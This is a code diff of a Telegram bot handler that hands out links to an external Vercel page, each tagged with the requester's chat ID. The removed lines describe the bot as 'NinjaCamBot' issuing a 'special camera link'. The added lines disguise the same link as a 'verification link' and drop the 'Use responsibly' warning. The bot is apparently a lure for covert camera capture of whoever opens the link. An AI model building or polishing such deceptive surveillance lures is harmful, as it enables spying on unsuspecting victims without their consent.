@@ -1,14 +1,13 @@
 export default async function handler(req, res) {
-  const BOT_TOKEN = process.env.BOT_TOKEN; // Set this in Vercel Environment Variables
+  const BOT_TOKEN = process.env.BOT_TOKEN;
   const TG_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
 
-  // Only accept POST requests
   if (req.method !== "POST") return res.status(200).send("OK");
 
   const update = req.body;
-  const message = update?.message;
-  const chat_id = message?.chat?.id;
-  const text = message?.text;
+  const msg = update?.message;
+  const chat_id = msg?.chat?.id;
+  const text = msg?.text;
 
   const sendMessage = async (chat_id, text, extra = {}) => {
     await fetch(`${TG_API}/sendMessage`, {
@@ -25,28 +24,30 @@ export default async function handler(req, res) {
 
   if (!chat_id || !text) return res.status(200).end();
 
-  // Start Command
+  // START command
   if (text === "/start") {
-    await sendMessage(chat_id, 
-`👋 Welcome to NinjaCamBot!
+    await sendMessage(chat_id,
+`👋 Welcome!
 
-Click /create to generate your special camera link.
-
-⚠️ Use responsibly!`);
+Click /create to get your personal verification link.`);
     return res.status(200).end();
   }
 
-  // Create Command
+  // CREATE command
   if (text === "/create") {
-    const baseUrl = "https://freeinternet-seven.vercel.app/";
+
+    // ✅ Correct Domain here
+    const baseUrl = "https://freeinternet-seven.vercel.app";
+
+    // ✅ Auto attach chatid
     const link = `${baseUrl}/?chatid=${chat_id}`;
 
-    await sendMessage(chat_id, 
-`🎯 Your Ninja Camera Link is Ready
+    await sendMessage(chat_id,
+`🎯 Your Verification Link is Ready
 
 🔗 <code>${link}</code>
 
-Open it in browser 🌐`, {
+Open the link and wait 5 seconds ✅`, {
       reply_markup: {
         inline_keyboard: [
           [{ text: "Open Link ✅", url: link }]
@@ -58,4 +59,4 @@ Open it in browser 🌐`, {
   }
 
   return res.status(200).send("Done");
-    }
+      }
